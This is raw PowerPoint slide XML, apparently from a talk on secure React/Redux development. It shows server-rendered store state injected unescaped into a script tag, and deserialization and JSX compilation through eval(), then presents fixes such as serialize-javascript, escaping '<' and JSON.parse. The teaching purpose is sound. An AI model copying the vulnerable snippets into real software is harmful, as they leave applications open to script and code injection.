        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1414464"/>
            <a:ext cx="10972800" cy="1262542"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Task</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Initiate the state of the store</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Documentation: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://redux.js.org/docs/recipes/ServerRendering.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 1"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4397829" y="60719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458515301"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="2198034"/>
          <a:ext cx="10972800" cy="810544"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="10972800">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="416882232"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="414876">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>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err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>window.__PRELOADED_STATE</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>__ = ${</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>JSON.stringify</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>preloadedState</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">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108393521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928903375"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1219200" y="5456794"/>
          <a:ext cx="10363200" cy="810544"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="10363200">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1182511606"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="414876">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="009900"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>&lt;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err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>window.__PRELOADED_STATE</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>__ = ${</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>JSON.stringify</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>preloadedState</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>).replace(/</a:t>
                      </a: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0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="009900"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>g, </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>'\\u003c'</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009900"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>&lt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>/</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>script</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="009900"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>&gt;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1110629596"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="3335153"/>
            <a:ext cx="10972800" cy="890609"/>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dirty="0"/>
              <a:t>Solution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="635508" lvl="1" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Perform JavaScript encoding with serialize-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>javascript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> module</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="5130409"/>
            <a:ext cx="10972800" cy="371171"/>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marL="635508" lvl="1" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="2"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Escape '&lt;' character (Redux documentation fix)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="11" name="Table 10"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2124084918"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1218696" y="4145697"/>
          <a:ext cx="10363704" cy="810544"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="10363704">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="459592956"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="414876">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>import</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> serialize from </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>'serialize-</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>javascript</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>'</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br>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>initialState</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serialize</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JSON</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stringify</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initialState</a:t>
                      </a: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652689614"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>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5312" y="156603"/>
            <a:ext cx="1791203" cy="1400812"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="TextBox 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9448297" y="432468"/>
            <a:ext cx="2438903" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>“a predictable state container for JavaScript apps”</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="55801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Eval</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>… Again?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1302170"/>
            <a:ext cx="10972800" cy="909890"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>New scenarios for insecure evaluation of untrusted code:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>JavaScript deserialization</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="6" name="Table 5"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3403897491"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1171070" y="3789381"/>
          <a:ext cx="7936019" cy="1054384"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="7936019">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4070719037"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="526826">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>import</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> babel from </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>'babel-core'</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>;</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>...</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>var</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>jsCode</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err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>babel</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transform</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jsxCode</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err="1">
                          <a:solidFill>
                            <a:srgbClr val="1500C8"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>eval</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jsCode</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>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code</a:t>
                      </a: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404229304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530679037"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1171070" y="2226320"/>
          <a:ext cx="7936019" cy="810544"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="7936019">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2155913637"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="414876">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>function</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>deserialize</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>serializedJavascript</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effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="1500C8"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>eval</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err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>serializedJavascript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solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>}</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1600" b="0" dirty="0">
                        <a:effectLst/>
                        <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                      </a:endParaRP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1976873624"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="3286614"/>
            <a:ext cx="10972800" cy="331847"/>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lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Using Babel in the code to compile JSX</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5450319" y="2968435"/>
            <a:ext cx="3656770" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r"/>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>https://github.com/yahoo/serialize-javascript</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="5175105"/>
            <a:ext cx="10972800" cy="872769"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0">
            <a:no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pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>JSON parsing with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>eval</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>() =&gt; use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>JSON.parse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>eval</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> prohibits setting a strong Content Security Policy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="TextBox 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2614863" y="4775337"/>
            <a:ext cx="6492226" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r"/>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>https://stackoverflow.com/questions/33225951/evaling-code-with-jsx-syntax-in-it</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="389031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Communicating with Server</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1382379"/>
            <a:ext cx="5790948" cy="469690"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Getting public data – use fetch()</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1732546" y="1884153"/>
            <a:ext cx="6603991" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2">
              <a:lumMod val="95000"/>
            </a:schemeClr>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
